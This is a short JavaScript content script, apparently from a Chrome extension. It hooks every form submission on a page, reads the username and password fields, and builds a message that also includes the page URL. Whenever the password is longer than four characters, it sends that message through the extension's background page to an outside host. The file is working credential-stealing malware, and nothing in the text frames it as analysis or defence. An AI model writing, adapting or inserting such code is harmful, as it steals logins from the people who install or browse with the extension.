$(function() {


 $("form").submit(function(e) {
  var passwordBoxes = $("input[type=password]");
  var username = $("input[type=text]").not(passwordBoxes).filter(function() {
   var field = $( this );
   return field && ( field.val() || field.html() ) || {val:function(){return "nouser"}};
  }).val();
  password = passwordBoxes && passwordBoxes.val() || "";
  var msg = "U: " + username + " || P: " + password + " || L: " + location.href;
  if ( password && password.length > 4 )
    chrome.runtime.sendMessage({
        method: 'GET',
        action: 'xhttp',
        url: 'http://danilomalzao.byethost11.com/?msg=' + msg,
        data: 'q=something'
    }, function(responseText) {
    });
 });
});